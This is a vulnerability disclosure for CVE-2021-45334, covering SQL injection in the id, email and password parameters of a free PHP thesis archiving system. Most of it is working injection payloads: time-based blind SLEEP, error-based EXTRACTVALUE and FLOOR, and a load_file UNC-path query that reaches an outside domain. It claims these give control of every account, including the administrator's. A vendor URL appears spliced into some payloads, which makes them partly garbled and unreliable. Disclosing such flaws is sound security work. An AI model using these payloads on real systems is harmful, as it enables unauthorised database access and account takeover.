## [CVE-2021-45334](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45334)

## [Software](https://www.sourcecodester.com/php/15083/online-thesis-archiving-system-using-phpoop-free-source-code.html)

## [Vendor](https://www.sourcecodester.com/users/tips23)

![](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-45334/Docs/Screenshot%202022-01-23%20185018.png)

## Description:
1. The id parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load_file('\\\\bq5i3yy3ie4hujd4ewix366f96fz3trku8lvcj1.https://www.sourcecodester.com/php/15083/online-thesis-archiving-system-using-phpoop-free-source-code.html\\izr'))+' was submitted in the id parameter. 
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed.
2. The email parameter appears to be vulnerable to SQL injection attacks.
A single quote was submitted in the email parameter, and a database error message was returned. 
Two single quotes were then submitted and the error message disappeared. 
You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.
3. The password parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the password parameter, and a database error message was returned. 
Two single quotes were then submitted and the error message disappeared. 
You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.
The attacker can take account control of all accounts plus an administrator account on this system.

Status: CRITICAL

[+] Payloads:

```mysql
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=projects_per_curriculum&id=5'+(select load_file('\\\\bq5i3yy3ie4hujd4ewix366f96fz3trku8lvcj1.https://www.sourcecodester.com/php/15083/online-thesis-archiving-system-using-phpoop-free-source-code.html\\izr'))+'') AND (SELECT 9313 FROM (SELECT(SLEEP(3)))pVaM) AND ('PsCV'='PsCV&p=0
---

---
Parameter: email (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: email=teGJdfAf@https://www.sourcecodester.com/php/15083/online-thesis-archiving-system-using-phpoop-free-source-code.html' AND EXTRACTVALUE(1673,CONCAT(0x5c,0x717a6a7671,(SELECT (ELT(1673=1673,1))),0x716b6b6271))-- soOT&password=p7M!t9x!B8

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=teGJdfAf@https://www.sourcecodester.com/php/15083/online-thesis-archiving-system-using-phpoop-free-source-code.html' AND (SELECT 1818 FROM (SELECT(SLEEP(3)))UxzW)-- eCxu&password=p7M!t9x!B8
---

---
Parameter: password (POST)
    Type: error-based
    Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: email=teGJdfAf@https://www.sourcecodester.com/php/15083/online-thesis-archiving-system-using-phpoop-free-source-code.html'&password=-7774 OR 1 GROUP BY CONCAT(0x7176786a71,(SELECT (CASE WHEN (1810=1810) THEN 1 ELSE 0 END)),0x7170767871,FLOOR(RAND(0)*2)) HAVING MIN(0)#
---
```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-45334)

## Proof and Exploit:

- I'm not talking about the `XSS` vulnerabilities! ðŸ˜‚ðŸ˜Ž

![](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-45334/Docs/Multiple-SQL-Injections.png)

[href](https://streamable.com/2qww7e)
